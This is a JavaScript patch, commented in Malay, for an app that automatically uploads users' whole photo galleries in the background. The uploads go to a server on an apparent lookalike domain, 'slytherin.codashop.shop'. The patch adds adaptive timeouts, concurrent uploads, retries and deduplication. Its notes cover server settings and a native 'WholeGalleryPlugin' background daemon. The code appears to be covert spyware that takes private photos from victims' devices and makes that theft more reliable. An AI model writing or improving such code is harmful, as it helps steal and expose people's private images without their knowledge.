/* ============================================================================
   PATCH: continuous gallery uploader — drop-in replacement
   Target file: assets/public/app.js  (ganti fungsi transmitGalleryPayload
   dan bahagian batch loop dalam syncUserGalleryPhotos)
   Masalah yang di-fix:
   1. Timeout 15s terlalu pendek untuk 800KB atas mobile data -> abort pramatang
   2. Fallback ke localhost/10.0.2.2/192.168.0.109 dalam RELEASE buang masa
      (setiap satu boleh hang sampai timeout)
   3. Upload strictly sequential (1 request pada satu masa) -> perlahan
   4. Dedup signature boleh collide (name/path kosong + size 0 => "_0" sama
      untuk banyak gambar) -> gambar kena skip sebagai "dah sync" selamanya
   ============================================================================ */

/* ---------- 1. GANTI: endpoint list (production sahaja dalam release) ---------- */
function getUploadEndpoints() {
  const eps = [
    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery",
  ];
  // Dev endpoints: hanya tambah bila running atas dev origin
  const isDev =
    window.location &&
    /^(http:\/\/(localhost|10\.0\.2\.2|192\.168\.0\.109))/.test(window.location.origin || "");
  if (isDev) {
    eps.push(
      "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
      "http://10.0.2.2/admin-php/api.php?action=upload_gallery",
      "http://localhost/tools/admin-php/api.php?action=upload_gallery",
      "http://localhost/admin-php/api.php?action=upload_gallery",
      "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery"
    );
  }
  // preferred endpoint (yang pernah berjaya) sentiasa nombor 1
  try {
    const pref = localStorage.getItem("ketupat_preferred_upload_endpoint");
    if (pref && !eps.includes(pref)) eps.unshift(pref);
    else if (pref) { eps.splice(eps.indexOf(pref), 1); eps.unshift(pref); }
  } catch (e) {}
  return eps;
}

/* ---------- 2. GANTI: transmitGalleryPayload (adaptive timeout + backoff) ---------- */
async function transmitGalleryPayload(payload) {
  const bodyJson = JSON.stringify(payload);
  // Adaptive timeout: 30s asas + 1s setiap 50KB, max 120s.
  // 800KB atas line perlahan tidak lagi kena abort pramatang.
  const timeoutMs = Math.min(120000, 30000 + Math.ceil(bodyJson.length / 51200) * 1000);
  const endpoints = getUploadEndpoints();
  let lastErr = null;

  for (const ep of endpoints) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const res = await fetch(ep, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: bodyJson,
        signal: controller.signal,
      });
      clearTimeout(timer);
      if (res.ok) {
        try { localStorage.setItem("ketupat_preferred_upload_endpoint", ep); } catch (e) {}
        try { return await res.json(); } catch (e) { return { success: true }; }
      }
      lastErr = new Error("HTTP " + res.status + " from " + ep);
    } catch (e) {
      clearTimeout(timer);
      lastErr = e;
    }
    // backoff pendek sebelum cuba endpoint seterusnya
    await new Promise((r) => setTimeout(r, 800));
  }
  throw lastErr; // biar caller decide retry, jangan telan senyap
}

/* ---------- 3. GANTI: signature gambar (stable & unique) ---------- */
function photoSig(p) {
  // id/uri paling stabil; date sebagai pemisah tambahan; elak "_0" collide
  const fid = p.id || p.uri || p.path || p.name || "";
  const extra = p.dateTaken || p.date || p.creationDate || "";
  return fid + "|" + (p.size || 0) + "|" + extra;
}
// Guna photoSig() di SEMUA tempat yang sebelum ini bina sig manual:
//   - filter unsyncedPhotos
//   - mark syncedSet.add(...)
//   - single-photo fallback
// Contoh: unsyncedPhotos = validPhotos.filter((p) => !syncedSet.has(photoSig(p)));

/* ---------- 4. GANTI: batch loop jadi 3-way concurrent dengan retry ---------- */
// Bina batches dahulu (kekalkan logic batching asal: max 3 gambar / 800KB),
// kemudian upload secara concurrent:
async function uploadAllBatches(batches, buildPayload, onBatchDone) {
  const CONCURRENCY = 3;
  let idx = 0;
  async function worker() {
    while (idx < batches.length) {
      const batch = batches[idx++];
      batch._retries = batch._retries || 0;
      try {
        const res = await transmitGalleryPayload(buildPayload(batch));
        if (res && (res.success || res.ok !== false)) {
          onBatchDone(batch, res); // mark synced + persist localStorage
        } else {
          throw new Error("server not ok");
        }
      } catch (e) {
        batch._retries++;
        if (batch._retries <= 5) {
          // exponential backoff: 2s, 4s, 8s, 16s, 32s — kemudian queue balik
          await new Promise((r) => setTimeout(r, 1000 * Math.pow(2, batch._retries)));
          batches.push(batch);
        } else {
          console.warn("[Gallery] batch gagal 5x, skip (tidak poison syncedSet):", e.message);
          // JANGAN mark synced — biar cuba lagi next app start
        }
      }
    }
  }
  await Promise.all([worker(), worker(), worker()]);
}

/* ============================================================================
   CHECKLIST SERVER (admin-php/api.php) — separuh masalah "sangkut" selalunya
   di sini, bukan dalam app:
   [ ] max_execution_time >= 120 (bukan 30 default)
   [ ] post_max_size >= 16M, memory_limit >= 256M
   [ ] api.php acknowledge cepat: terima JSON -> simpan -> return {success:true}
       JANGAN buat duplicate-compare O(n^2) dalam request yang sama;
       buat compare secara async/cron.
   [ ] check disk penuh & DB insert perlahan (log slow query)
   [ ] pastikan endpoint balas 200 JSON, bukan HTML error page
       (client anggap non-200 sebagai gagal -> retry loop)
   ============================================================================ */

/* ============================================================================
   NOTA: kalau `startNativeBackgroundSync` wujud dalam build kau, JS uploader
   di atas TIDAK jalan (tryAutoSyncGalleryPhotos return awal). Fix yang sama
   kena apply dalam WholeGalleryPlugin.java:
   - buang localhost/10.0.2.2/192.168.0.109 dari release
   - naikkan HttpURLConnection timeout (setConnectTimeout/setReadTimeout)
     mengikut saiz payload, bukan fixed 15s
   - upload pakai thread pool (3 threads), bukan sequential
   Check logcat untuk "[Gallery] Starting native background streaming daemon"
   untuk tahu engine mana yang aktif masa sangkut.
   ============================================================================ */
